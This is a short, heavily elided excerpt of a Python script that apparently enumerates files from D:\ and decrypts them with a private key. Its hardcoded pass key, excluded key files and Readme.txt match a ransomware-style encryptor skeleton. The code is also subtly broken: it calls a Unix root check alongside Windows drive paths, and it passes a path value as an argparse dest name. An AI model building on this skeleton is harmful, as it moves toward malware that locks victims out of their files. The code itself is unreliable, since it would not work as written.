...
passKey = "12345"
dirIgnoreList = []
excludedFiles = [self, 'D:\\public_key.pem', 'D:\\private_key.pem', 'D:\\Readme.txt']
origin = "D:\\"
...
def decrypt():
    ...
    try:
        with open('D:\\private_key.pem', "rb") as key_file:
...
if(os.getuid() == 0):
    ...
    parser.add_argument('-o', '--origin', dest=origin, default=origin, type=str, required=False, help="Root path to start enumeration, defaults to 'D:\\'")
